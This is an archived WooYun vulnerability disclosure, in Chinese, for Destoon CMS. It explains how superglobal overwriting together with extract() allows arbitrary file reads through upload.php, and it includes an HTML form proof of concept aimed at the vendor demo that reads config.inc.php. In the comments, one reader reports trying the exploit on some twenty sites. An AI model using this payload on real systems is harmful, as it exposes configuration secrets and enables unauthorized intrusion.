{"id": 1583, "wybug_id": "wooyun-2014-063895", "wybug_title": "Destoon 20140530最新版超全局变量覆盖导致的安全问题(官方demo演示)", "wybug_corp": "DESTOON", "wybug_author": "索马里的海贼", "wybug_date": "2014-06-07 14:51", "wybug_open_date": "2014-09-05 14:52", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-05：\t细节向公众公开  简要描述： 短时间没找到合适的注入 找了个任意文件读取发上来了 详细说明：  代码片段0x1 /common.inc.php行17\nforeach(array('_POST', '_GET', '_COOKIE') as $__R) {\tif($$__R) { foreach($$__R as $__k => $__v) { if(isset($$__k) && $$__k == $__v) unset($$__k); } }}\n这里的逻辑是 如果 post get cookie 请求中的$$key和$value相等 就unset掉$$key如果我们向1.php?x=1提交一个POST请求 内容为_GET[x]=1因为?x=1 所以$_GET内容为 array('x'=>'1')当开始遍历$_POST的时候 $__k是_GET[x] 所以$$__k 就是$_GET[x]也就是array('x'=>'1')$__v是POST上来的一个数组 内容也是array('x'=>'1')$$__k == $__v成立所以 我们的超全局变量 $_GET就这么华丽丽的被unset了代码片段0x2 /common.inc.php行65\nif($_POST) { $_POST = strip_sql($_POST); strip_key($_POST); }if($_GET) { $_GET = strip_sql($_GET); strip_key($_GET); }if($_COOKIE) { $_COOKIE = strip_sql($_COOKIE); strip_key($_COOKIE); }if(!IN_ADMIN) {\t$BANIP = cache_read('banip.php');\tif($BANIP) banip($BANIP);\t$destoon_task = '';}if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);\n由于我们的$_GET已经在前面被unset了 所以即使加了EXTR_SKIP extract($_POST)仍然能够正常的初始化$_GET extract($_GET)的值就成功绕过了全局的strip_sql 和strip_key函数的检查。短时间没有找到合适的注入点，却发现了另外一个问题其实不光光是$_GET,$_FILES也是可以覆盖的。$_FILES的覆盖比$_GET要稍微复杂一些，因为$_FILES初始值是array()且只在有文件上传的时候才会重新初始化因为上面判断是$$__k == $__v而能跟array() ==的只有null、false和array()很明显这些我们都无法用get post或者cookie提交上去如果我们真的上传了一个文件 那$_FILES[file][tmp_name]又是一个未知量 所以 这里我把上传的包改了 删掉了filename 这样上传就会出错，$_FILES就会被初始化成array(    'name'=>'',    'type'=>'',    'size'=>0,    'tmp_name'=>'',    'error'=>4)这个数组我们就可以伪造了，伪造一个相同的数组之后，$_FILES就被unset了 我们就能用$_POST 或者$_GET来重新初始化它来看下利用的地方：代码片段0x3 /upload.php行66\n$do = new upload($_FILES, $uploaddir);省略部分…………if($do->save()) {\n可以看到$_FILES直接丢给了upload类 然后直接save了代码片段0x4 /include/upload.class.php行43\nfunction save() {\t\t//前面的都不关心\t\tif(!move_uploaded_file($this->file, DT_ROOT.'/'.$this->saveto) && !copy($this->file, DT_ROOT.'/'.$this->saveto))\t\t//后面的也不关心\t}\n这里除了用到move_uploaded_file外 还尝试了copy我们知道 move_uploaded_file是会检查第一个参数的 如果不是合法的上传文件就会返回false而copy就简单粗暴的多了 不管你是哪的 直接给你拷贝过去$this->file其实就是$_FILES[file][tmp_name] 而这个值现在是可以自己构造的了，所以这里就可以读取任意文件了POC如下：\n<form enctype=\"multipart/form-data\" action=\"http://demo.destoon.com/v5.0/upload.php?from=file&_FILES[file][name]=&_FILES[file][type]=&_FILES[file][size]=0&_FILES[file][tmp_name]=&_FILES[file][error]=4\" method=\"POST\"><input type=\"hidden\" name=\"_FILES[file][name]\" value = \"1.rar\"><input type=\"hidden\" name=\"_FILES[file][type]\" value = \"rar\"><input type=\"hidden\" name=\"_FILES[file][size]\" value = \"0\"><input type=\"hidden\" name=\"_FILES[file][tmp_name]\" value = \"config.inc.php\"><input type=\"hidden\" name=\"_FILES[file][error]\" value = \"4\"><input name=\"file\" type=\"file\" /><input type=\"submit\" value=\"POST\" /></form>\n这里用$_GET配合上传unset了$_FILES然后在extract($_POST)的时候重新初始化了$_FILES随便选个文件提交拦下数据包 修改Content-Disposition: form-data; name=\"file\"; filename=\"\"中的filename字段为空 如图就返回了我们要读取的文件了   漏洞证明：  \n\n\n\n   修复方案：  第一个foreach一直没明白是干嘛的。。。   版权声明：转载请注明来源 索马里的海贼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-06-09 15:02 厂商回复： 感谢反馈 我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-07 15:52 |    \t\ttzrj \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:24        | 1111)\t\t \n  我第一眼居然看成DZ了  吓我一跳    \n     2014-06-07 16:44 |    \t\t红领巾 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:4        | 有些漏洞，如果只是从技术层面来说明问题，...)\t\t \n  @tzrj 我看成了dede    \n     2014-06-07 17:27 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @索马里的海贼所谓漏洞利益最大化，你应该别急着发的~反正是0day，再研究一下说不定能getshell    \n     2014-06-07 17:44 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @phith0n 其实是我已经大概翻过一遍了，而且再细看的话rank也不会从15变成150 所以草草结束这个看下一个去了    \n     2014-07-04 11:09 |    \t\t爱小菜 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | 本人菜鸟一枚，努力学习天天向上！希望能让...)\t\t \n  @索马里的海贼 贼哥，请问你这个漏洞用什么抓包工具啊？我咋没找到那款工具呢？    \n     2014-07-04 11:36 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @爱小菜 fiddler2    \n     2014-07-04 12:12 |    \t\t爱小菜 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | 本人菜鸟一枚，努力学习天天向上！希望能让...)\t\t \n  @索马里的海贼 贼哥，谢了，我去测试了    \n     2014-07-04 12:43 |    \t\t爱小菜 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | 本人菜鸟一枚，努力学习天天向上！希望能让...)\t\t \n  @索马里的海贼 贼哥，你这个漏洞不行啊！我连续测试了近20个网站，清一色提示：“没有权限上传文件”呀！    \n     2014-07-04 13:22 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @爱小菜 注册个账号 登录    \n     2014-07-05 13:45 |    \t\t爱小菜 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | 本人菜鸟一枚，努力学习天天向上！希望能让...)\t\t \n  @索马里的海贼 贼哥， 我还有个问题想问下您：是不是我的操作步骤有问题？我的操作步骤是首先上传一个文件，然后通过浏览器get打开这个文件，否则按照教程中说的步骤没法上传空文件名，会提示没有任何文件被上传~！    \n     2014-09-05 22:37 |    \t\t0c0c0f \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:15        | My H34rt c4n 3xploit 4ny h0les!)\t\t \n  当开始遍历$_POST的时候 $__k是_GET[x] 所以$$__k 就是$_GET[x]也就是array('x'=>'1')$__v是POST上来的一个数组 内容也是array('x'=>'1')这里应该是可可变量，跟什么post上来一个数组没有关系吧    \n     2014-09-24 16:48 |    \t\tazuer \t\t\t( 普通白帽子  |\t\t\t        Rank:127 漏洞数:30        )\t\t \n  在哪个地方上传文件？ 直接利用洞主的exp 提示没有上传权限。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}